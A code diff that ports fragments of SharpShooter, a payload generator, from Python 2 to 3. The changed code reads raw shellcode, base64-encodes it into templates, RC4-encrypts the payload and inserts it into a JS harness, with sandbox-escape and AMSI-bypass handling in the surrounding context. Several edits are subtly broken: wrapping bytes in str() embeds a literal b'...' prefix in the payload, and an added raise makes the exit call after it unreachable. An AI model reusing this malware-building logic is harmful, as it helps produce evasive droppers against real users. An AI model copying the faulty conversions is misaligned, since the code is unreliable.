@@ -167,7 +167,8 @@ class SharpShooter:
         return content
 
     def rand_key(self, n):
-        return ''.join([random.choice(string.lowercase) for i in xrange(n)])
+        letters = string.ascii_lowercase
+        return ''.join([random.choice(letters) for i in range(n)])
 
     def gzip_str(self, string_):
         fgz = BytesIO()
@@ -182,7 +183,7 @@ class SharpShooter:
         return fgz
 
     def rc4(self, key, data):
-        S = range(256)
+        S = list(range(256))
         j = 0
         out = []
 
@@ -323,7 +324,7 @@ End Sub"""
             elif(payload_type == 9):
                 file_type = "slk"
         except Exception as e:
-            print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
+            print("\n\033[1;31m[!]\033[0;0m Incorrect choice 1")
 
         sandbox_techniques=""
         techniques_list = []
@@ -399,7 +400,7 @@ End Sub"""
                     break
 
             except Exception as e:
-                print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
+                print("\n\033[1;31m[!]\033[0;0m Incorrect choice 2")
 
         template_code = template_body.replace("%SANDBOX_ESCAPES%", sandbox_techniques)
 
@@ -438,13 +439,13 @@ End Sub"""
                     shellcode_gzip = self.gzip_str(shellcode_final)
 
                 elif (args.stageless or stageless_payload is True):
-                    rawsc = self.read_file(args.rawscfile)
+                    rawsc = open(args.rawscfile,'rb').read()
                     encoded_sc = base64.b64encode(rawsc)
                     #if("vbs" in file_type or "hta" in file_type):
                     #    sc_split = [encoded_sc[i:i+100] for i in range(0, len(encoded_sc), 100)]
                     #    for i in sc_split:
                     #else:
-                    template_code = template_code.replace("%SHELLCODE64%", encoded_sc)
+                    template_code = template_code.replace("%SHELLCODE64%", str(encoded_sc))
 
                 else:
                     refs = args.refs
@@ -493,7 +494,8 @@ End Sub"""
                 break
             except Exception as e:
                 print(e)
-                print("\n\033[1;31m[!]\033[0;0m Incorrect choice")
+                print("\n\033[1;31m[!]\033[0;0m Incorrect choice 3")
+                raise(e)
                 sys.exit(-1)
 
         amsi_bypass = ""
@@ -516,13 +518,13 @@ End Sub"""
 
         key = self.rand_key(10)
         payload_encrypted = self.rc4(key, template_code)
-        payload_encoded = base64.b64encode(payload_encrypted)
+        payload_encoded = base64.b64encode(bytes(payload_encrypted,'utf-8'))
 
         awl_payload_simple = ""
 
         if("js" in file_type or args.comtechnique):
             harness = self.read_file("templates/harness.js")
-            payload = harness.replace("%B64PAYLOAD%", payload_encoded)
+            payload = harness.replace("%B64PAYLOAD%", str(payload_encoded))
             payload = payload.replace("%KEY%", "'%s'" % (key))
             payload_minified = jsmin(payload)
             awl_payload_simple = template_code
